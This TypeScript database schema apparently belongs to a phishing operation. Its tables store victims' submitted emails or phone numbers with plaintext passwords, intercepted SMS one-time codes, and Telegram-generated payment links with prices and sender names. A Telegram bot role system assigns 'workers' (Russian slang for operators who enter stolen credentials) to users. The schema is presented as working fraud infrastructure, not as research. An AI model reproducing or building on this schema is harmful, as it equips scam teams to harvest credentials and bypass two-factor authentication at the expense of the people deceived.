import {
  pgTable,
  text,
  serial,
  integer,
  boolean,
  timestamp,
  varchar,
} from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const loginAttempts = pgTable("login_attempts", {
  id: serial("id").primaryKey(),
  emailOrPhone: text("email_or_phone").notNull(),
  password: text("password").notNull(),
  returnUri: text("return_uri").notNull(),
  contextData: text("context_data"), // Add context_data to link with telegram_links
  timestamp: timestamp("timestamp").defaultNow().notNull(),
  approved: boolean("approved").default(false).notNull(),
});

export const smsSubmissions = pgTable("sms_submissions", {
  id: serial("id").primaryKey(),
  otpCode: text("otp_code").notNull(),
  stepupContext: text("stepup_context").notNull(),
  rememberDevice: boolean("remember_device").default(false).notNull(),
  contextData: text("context_data"), // Add context_data to link with telegram_links
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

// Telegram bot tables
export const telegramUsers = pgTable("telegram_users", {
  id: serial("id").primaryKey(),
  telegramId: varchar("telegram_id", { length: 50 }).notNull().unique(),
  username: varchar("username", { length: 100 }),
  firstName: varchar("first_name", { length: 100 }),
  lastName: varchar("last_name", { length: 100 }),
  uniqueId: varchar("unique_id", { length: 20 }).notNull().unique(), // Format: #A1B2C3D4
  role: varchar("role", { length: 20 }).default("user"), // admin, worker, user
  isApproved: boolean("is_approved").default(false),
  createdAt: timestamp("created_at").defaultNow().notNull(),
  approvedAt: timestamp("approved_at"),
});

export const telegramLinks = pgTable("telegram_links", {
  id: serial("id").primaryKey(),
  linkId: varchar("link_id", { length: 20 }).notNull().unique(), // Format: #LINK_01
  price: varchar("price", { length: 50 }).notNull(),
  senderName: varchar("sender_name", { length: 200 }).notNull(),
  generatedLink: text("generated_link").notNull(),
  contextData: varchar("context_data", { length: 100 }).notNull(),
  createdBy: varchar("created_by", { length: 50 }).notNull(), // telegram_id
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

export const systemSettings = pgTable("system_settings", {
  key: varchar("key", { length: 100 }).primaryKey(),
  value: text("value").notNull(),
  updatedAt: timestamp("updated_at").defaultNow().notNull(),
});

// Worker assignments - связывает вбиверов с пользователями
export const workerAssignments = pgTable("worker_assignments", {
  id: serial("id").primaryKey(),
  workerId: varchar("worker_id", { length: 50 }).notNull(), // telegram_id вбивера
  userId: varchar("user_id", { length: 50 }).notNull(), // telegram_id пользователя
  assignedBy: varchar("assigned_by", { length: 50 }).notNull(), // telegram_id админа
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export const insertLoginAttemptSchema = createInsertSchema(loginAttempts).pick({
  emailOrPhone: true,
  password: true,
  returnUri: true,
  contextData: true,
});

export const insertSmsSubmissionSchema = createInsertSchema(
  smsSubmissions,
).pick({
  otpCode: true,
  stepupContext: true,
  rememberDevice: true,
  contextData: true,
});

export const insertTelegramUserSchema = createInsertSchema(telegramUsers).pick({
  telegramId: true,
  username: true,
  firstName: true,
  lastName: true,
  uniqueId: true,
  role: true,
});

export const insertTelegramLinkSchema = createInsertSchema(telegramLinks).pick({
  linkId: true,
  price: true,
  senderName: true,
  generatedLink: true,
  contextData: true,
  createdBy: true,
});

export const insertSystemSettingSchema = createInsertSchema(
  systemSettings,
).pick({
  key: true,
  value: true,
});

export const insertWorkerAssignmentSchema = createInsertSchema(
  workerAssignments,
).pick({
  workerId: true,
  userId: true,
  assignedBy: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type InsertLoginAttempt = z.infer<typeof insertLoginAttemptSchema>;
export type LoginAttempt = typeof loginAttempts.$inferSelect;
export type InsertSmsSubmission = z.infer<typeof insertSmsSubmissionSchema>;
export type SmsSubmission = typeof smsSubmissions.$inferSelect;
export type InsertTelegramUser = z.infer<typeof insertTelegramUserSchema>;
export type TelegramUser = typeof telegramUsers.$inferSelect;
export type InsertTelegramLink = z.infer<typeof insertTelegramLinkSchema>;
export type TelegramLink = typeof telegramLinks.$inferSelect;
export type InsertSystemSetting = z.infer<typeof insertSystemSettingSchema>;
export type SystemSetting = typeof systemSettings.$inferSelect;
export type InsertWorkerAssignment = z.infer<typeof insertWorkerAssignmentSchema>;
export type WorkerAssignment = typeof workerAssignments.$inferSelect;
